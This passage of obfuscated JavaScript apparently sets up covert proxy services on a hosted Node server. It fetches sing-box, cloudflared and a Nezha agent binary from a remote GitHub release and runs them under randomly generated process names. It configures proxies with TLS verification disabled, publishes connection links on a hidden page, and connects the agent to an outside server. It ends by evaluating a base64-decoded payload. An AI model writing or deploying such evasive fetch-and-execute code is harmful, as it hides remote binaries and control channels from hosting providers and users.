_0x362e26=_0x38e1bb[_0x31c761(0x253)](/PrivateKey:\s*(\S+)/),_0xb55da1=_0x38e1bb[_0x31c761(0x253)](/PublicKey:\s*(\S+)/);_0x362e26&&_0xb55da1&&(CONFIG['REALITY_PRIVATE_KEY']=_0x362e26[0x1],CONFIG[_0x31c761(0x185)]=_0xb55da1[0x1]);}_0xa180b6();});});}async function generateSingBoxConfig(){const _0x3761c5=_0xb15734,_0x29dcec=[];CONFIG[_0x3761c5(0x19f)]&&_0x29dcec[_0x3761c5(0x24b)]({'type':'hysteria2','tag':_0x3761c5(0x1b8),'listen':'::','listen_port':parseInt(CONFIG[_0x3761c5(0x19f)]),'users':[{'password':CONFIG[_0x3761c5(0x1e2)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x3761c5(0x21a)],'insecure':!![],'alpn':['h3']}});CONFIG[_0x3761c5(0x1f1)]&&_0x29dcec[_0x3761c5(0x24b)]({'type':_0x3761c5(0x1e4),'tag':_0x3761c5(0x1f7),'listen':'::','listen_port':parseInt(CONFIG[_0x3761c5(0x1f1)]),'users':[{'uuid':CONFIG[_0x3761c5(0x1f8)],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG['VMESS_PATH'],'headers':{}}});CONFIG[_0x3761c5(0x23a)]&&_0x29dcec[_0x3761c5(0x24b)]({'type':_0x3761c5(0x1b1),'tag':_0x3761c5(0x23e),'listen':'::','listen_port':parseInt(CONFIG[_0x3761c5(0x23a)]),'users':[{'uuid':CONFIG[_0x3761c5(0x1f8)],'flow':_0x3761c5(0x212)}],'tls':{'enabled':!![],'server_name':CONFIG[_0x3761c5(0x205)],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x3761c5(0x205)],'server_port':0x1bb},'private_key':CONFIG[_0x3761c5(0x193)],'short_id':[CONFIG[_0x3761c5(0x1e3)]]}}});CONFIG[_0x3761c5(0x1f0)]&&_0x29dcec[_0x3761c5(0x24b)]({'type':_0x3761c5(0x1aa),'tag':_0x3761c5(0x1fc),'listen':'::','listen_port':parseInt(CONFIG[_0x3761c5(0x1f0)]),'users':[{'uuid':CONFIG[_0x3761c5(0x21d)],'password':CONFIG['TUIC_PASSWORD']}],'congestion_control':_0x3761c5(0x235),'auth_timeout':'3s','zero_rtt_handshake':![],'heartbeat':_0x3761c5(0x1bf),'tls':{'enabled':!![],'server_name':CONFIG[_0x3761c5(0x21a)],'insecure':!![],'alpn':['h3']}});const _0x16183e={'log':{'level':_0x3761c5(0x1fe),'timestamp':!![]},'dns':{'servers':[{'tag':'google','address':_0x3761c5(0x1d6)},{'tag':_0x3761c5(0x230),'address':_0x3761c5(0x23c)}],'final':'google'},'inbounds':_0x29dcec,'outbounds':[{'type':_0x3761c5(0x231),'tag':'direct'},{'type':_0x3761c5(0x1e7),'tag':_0x3761c5(0x1e7)}],'route':{'rules':[{'ip_is_private':!![],'outbound':_0x3761c5(0x231)}],'final':_0x3761c5(0x231)},'experimental':{'cache_file':{'enabled':!![],'path':path[_0x3761c5(0x1a4)](WORK_DIR,_0x3761c5(0x1a0))}}},_0x5aa5fc=path[_0x3761c5(0x1a4)](WORK_DIR,_0x3761c5(0x18c));return fs['writeFileSync'](_0x5aa5fc,JSON['stringify'](_0x16183e,null,0x2)),_0x5aa5fc;}function generateLinks(_0x2be521){const _0x287c60=_0xb15734,_0x5ccf80=[];CONFIG[_0x287c60(0x19f)]&&_0x5ccf80[_0x287c60(0x24b)]({'protocol':'Hysteria2','url':_0x287c60(0x1dd)+CONFIG[_0x287c60(0x1e2)]+'@'+_0x2be521+':'+CONFIG[_0x287c60(0x19f)]+'?insecure=1&sni='+CONFIG[_0x287c60(0x21a)]+_0x287c60(0x184)});if(CONFIG[_0x287c60(0x1f1)]){const _0x436f55={'v':'2','ps':_0x287c60(0x1c9),'add':CONFIG[_0x287c60(0x190)],'port':_0x287c60(0x191),'id':CONFIG['VMESS_UUID'],'aid':'0','scy':_0x287c60(0x1b5),'net':'ws','type':_0x287c60(0x1de),'host':CONFIG['C_D'],'path':CONFIG[_0x287c60(0x1b3)],'tls':'tls','sni':CONFIG[_0x287c60(0x1cf)],'alpn':'','fp':_0x287c60(0x1f4)};_0x5ccf80['push']({'protocol':'VMess','url':_0x287c60(0x252)+Buffer[_0x287c60(0x238)](JSON[_0x287c60(0x1bd)](_0x436f55))[_0x287c60(0x1c0)]('base64')});}return CONFIG['REALITY_PORT']&&_0x5ccf80['push']({'protocol':_0x287c60(0x209),'url':'vless://'+CONFIG[_0x287c60(0x1f8)]+'@'+_0x2be521+':'+CONFIG[_0x287c60(0x23a)]+_0x287c60(0x217)+CONFIG[_0x287c60(0x205)]+_0x287c60(0x1b0)+CONFIG[_0x287c60(0x185)]+'&sid='+CONFIG[_0x287c60(0x1e3)]+_0x287c60(0x1a3)}),CONFIG['TUIC_PORT']&&_0x5ccf80[_0x287c60(0x24b)]({'protocol':_0x287c60(0x198),'url':_0x287c60(0x22f)+CONFIG[_0x287c60(0x21d)]+':'+CONFIG[_0x287c60(0x1db)]+'@'+_0x2be521+':'+CONFIG['TUIC_PORT']+'?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#TUIC'}),_0x5ccf80;}function cleanup(){const _0xba35f2=_0xb15734;processes[_0xba35f2(0x1d2)](_0x4f6f2a=>{const _0x507757=_0xba35f2;try{_0x4f6f2a[_0x507757(0x189)]();}catch(_0x1d740b){}}),process['exit'](0x0);}async function startService(_0x2547d1,_0x1d2d2a,_0xe51b99,_0x1e9b50={}){const _0x565963=_0xb15734;try{const _0x54894e=spawn(_0x2547d1,_0x1d2d2a,{'stdio':[_0x565963(0x19c),_0x565963(0x1c4),_0x565963(0x1c4)],..._0x1e9b50});if(_0x1e9b50[_0x565963(0x1e5)]){const _0x3a418b=fs[_0x565963(0x1a7)](_0x1e9b50[_0x565963(0x1e5)]);_0x54894e['stdout'][_0x565963(0x1c4)](_0x3a418b),_0x54894e[_0x565963(0x22e)][_0x565963(0x1c4)](_0x3a418b);}return serviceStatus[_0xe51b99[_0x565963(0x18f)]()]=_0x565963(0x199),_0x54894e['on'](_0x565963(0x1f6),()=>{const _0x2768e4=_0x565963;serviceStatus[_0xe51b99[_0x2768e4(0x18f)]()]=_0x2768e4(0x199);}),_0x54894e['on']('error',()=>{const _0x380ce2=_0x565963;serviceStatus[_0xe51b99['toLowerCase']()]=_0x380ce2(0x254);}),_0x54894e['on'](_0x565963(0x24f),()=>{const _0x3b53bb=_0x565963;serviceStatus[_0xe51b99[_0x3b53bb(0x18f)]()]=_0x3b53bb(0x213);}),new Promise(_0x106dce=>{const _0x5a3cd2=()=>{const _0x4e21bc=_0xf451;_0x54894e[_0x4e21bc(0x1e6)]?(serviceStatus[_0xe51b99[_0x4e21bc(0x18f)]()]=_0x4e21bc(0x213),_0x106dce(null)):(processes[_0x4e21bc(0x24b)](_0x54894e),_0x106dce(_0x54894e));};setTimeout(_0x5a3cd2,0x7d0);});}catch(_0x109f1e){return serviceStatus[_0xe51b99[_0x565963(0x18f)]()]='error',null;}}const app=express();app[_0xb15734(0x207)]('/',(_0x52c3c2,_0xb10164)=>{const _0x4f3fe2=_0xb15734;_0xb10164[_0x4f3fe2(0x20c)](0xc8,{'Content-Type':_0x4f3fe2(0x1ee)}),_0xb10164[_0x4f3fe2(0x236)](HTML_TEMPLATES[_0x4f3fe2(0x1ad)]);}),app['get'](_0xb15734(0x1cc),async(_0x542102,_0x4cf7c9)=>{const _0x2c04d8=_0xb15734,_0x2185e6=await getServerIP(),_0x2184cb=generateLinks(_0x2185e6);_0x4cf7c9[_0x2c04d8(0x20c)](0xc8,{'Content-Type':_0x2c04d8(0x1ee)}),_0x4cf7c9[_0x2c04d8(0x236)](HTML_TEMPLATES['status'](_0x2185e6,_0x2184cb));}),app[_0xb15734(0x207)]('/x',async(_0x55800e,_0xa213bf)=>{const _0x3c5710=_0xb15734,_0x143f6a=await getServerIP(),_0x405ef8=generateLinks(_0x143f6a);_0xa213bf[_0x3c5710(0x20c)](0xc8,{'Content-Type':_0x3c5710(0x1ee)}),_0xa213bf['end'](HTML_TEMPLATES[_0x3c5710(0x23b)](_0x143f6a,_0x405ef8));}),app[_0xb15734(0x207)](_0xb15734(0x219),(_0x3312e1,_0x4b4c0a)=>{const _0x500e71=_0xb15734;_0x4b4c0a['writeHead'](0xc8,{'Content-Type':'application/json'}),_0x4b4c0a[_0x500e71(0x236)](JSON['stringify']({'status':'ok','uptime':process[_0x500e71(0x202)]()}));});const server=http['createServer'](app);server['on'](_0xb15734(0x229),createProxyMiddleware({'target':_0xb15734(0x22c)+CONFIG[_0xb15734(0x1f1)],'changeOrigin':!![],'ws':!![],'logLevel':'silent'}));async function main(){const _0x3d0e29=_0xb15734;server[_0x3d0e29(0x182)](CONFIG[_0x3d0e29(0x1cd)],()=>{const _0x634a83=_0x3d0e29;serviceStatus[_0x634a83(0x1ea)]=_0x634a83(0x199);});try{const _0x1bb67e=detectArch(),_0x297718=_0x1bb67e===_0x3d0e29(0x1c7),_0x345417=getRandomProcessName(),_0x2a39da=getRandomProcessName(),_0x2f3d97=getRandomProcessName(),_0x34621c=path[_0x3d0e29(0x1a4)](WORK_DIR,_0x345417),_0x4d6c1b=path['join'](WORK_DIR,_0x2a39da),_0xc3eb4e=path[_0x3d0e29(0x1a4)](WORK_DIR,_0x2f3d97),_0x12c472={'singbox':_0x297718?_0x3d0e29(0x18b):'https://github.com/seav1/dl/releases/download/upx/sb','cloudflared':_0x297718?_0x3d0e29(0x1ce):'https://github.com/seav1/dl/releases/download/upx/cf','nezha':_0x297718?_0x3d0e29(0x1a6):_0x3d0e29(0x208)};await Promise[_0x3d0e29(0x243)]([downloadBinary(_0x12c472['singbox'],_0x34621c),downloadBinary(_0x12c472[_0x3d0e29(0x221)],_0x4d6c1b),downloadBinary(_0x12c472[_0x3d0e29(0x20f)],_0xc3eb4e)]),[_0x34621c,_0x4d6c1b,_0xc3eb4e][_0x3d0e29(0x1d2)](_0x4a267d=>{const _0x2603fd=_0x3d0e29;if(!fs[_0x2603fd(0x223)](_0x4a267d))throw new Error('文件未找到:\x20'+_0x4a267d);});const _0x49a80e=await getServerIP();if(CONFIG['HY2_PORT']||CONFIG[_0x3d0e29(0x1f1)]||CONFIG[_0x3d0e29(0x23a)]||CONFIG[_0x3d0e29(0x1f0)]){await generateRealityKeys(_0x34621c);const _0x23a727=await generateSingBoxConfig();try{await new Promise((_0x4314e9,_0x11526a)=>{const _0xa116e1=_0x3d0e29;exec('\x22'+_0x34621c+_0xa116e1(0x181)+_0x23a727+'\x22',_0x540d8e=>{_0x540d8e?_0x11526a(_0x540d8e):_0x4314e9();});}),await startService(_0x34621c,[_0x3d0e29(0x1d9),'-c',_0x23a727],_0x3d0e29(0x1af));}catch(_0x13c7fa){serviceStatus[_0x3d0e29(0x1af)]='error';}}if(CONFIG[_0x3d0e29(0x1f5)])try{const _0xe3f8f9=[_0x3d0e29(0x1fa),_0x3d0e29(0x1a8),_0x3d0e29(0x1b5),'--protocol',_0x3d0e29(0x1bb),'--no-autoupdate',_0x3d0e29(0x1d9),_0x3d0e29(0x1fd),CONFIG[_0x3d0e29(0x1f5)],'--url',_0x3d0e29(0x250)+CONFIG[_0x3d0e29(0x1cd)]];await startService(_0x4d6c1b,_0xe3f8f9,_0x3d0e29(0x221));}catch(_0x26f3e7){serviceStatus[_0x3d0e29(0x221)]='error';}else{if(CONFIG[_0x3d0e29(0x1f1)]){const _0x178381=await startTempTunnel(_0x4d6c1b,CONFIG[_0x3d0e29(0x1cd)]);!_0x178381&&(serviceStatus[_0x3d0e29(0x221)]=_0x3d0e29(0x254));}}if(CONFIG['N_S']&&CONFIG[_0x3d0e29(0x1ef)]){const _0x25b55e=['-s',CONFIG[_0x3d0e29(0x19e)]+':'+CONFIG[_0x3d0e29(0x197)],'-p',''+CONFIG[_0x3d0e29(0x1ef)],_0x3d0e29(0x24c),'3',_0x3d0e29(0x21c)];(CONFIG['N_T']==='--tls'||typeof CONFIG[_0x3d0e29(0x18e)]===_0x3d0e29(0x206)&&CONFIG[_0x3d0e29(0x18e)][_0x3d0e29(0x20a)](_0x3d0e29(0x227)))&&_0x25b55e[_0x3d0e29(0x24b)](_0x3d0e29(0x227));try{await startService(_0xc3eb4e,_0x25b55e,_0x3d0e29(0x20f),{'logFile':path['join'](WORK_DIR,_0x3d0e29(0x244))});}catch(_0x2e26d8){serviceStatus['nezha']=_0x3d0e29(0x254);}}setInterval(()=>{const _0x2f14ed=_0x3d0e29;processes[_0x2f14ed(0x1d2)](_0x506733=>{const _0x29f0e0=_0x2f14ed;if(_0x506733[_0x29f0e0(0x1e6)]){const _0xb1ca08=Object[_0x29f0e0(0x18a)](serviceStatus)[_0x29f0e0(0x192)](_0x2ebe1b=>serviceStatus[_0x2ebe1b]===_0x29f0e0(0x199)&&!processes[_0x29f0e0(0x1c6)](_0x2de74b=>_0x2de74b!==_0x506733&&!_0x2de74b[_0x29f0e0(0x1e6)]));_0xb1ca08&&(serviceStatus[_0xb1ca08]=_0x29f0e0(0x213));}}),processes[_0x2f14ed(0x251)]>0x0&&processes[_0x2f14ed(0x240)](_0x174d52=>_0x174d52[_0x2f14ed(0x1e6)])&&cleanup();},0x2710),process['on'](_0x3d0e29(0x255),cleanup),process['on']('SIGTERM',cleanup);}catch(_0x315e00){process[_0x3d0e29(0x24f)](0x1);}}main()[_0xb15734(0x1e1)](()=>process['exit'](0x1));';
const code = Buffer.from(b, 'base64').toString();
eval(code);
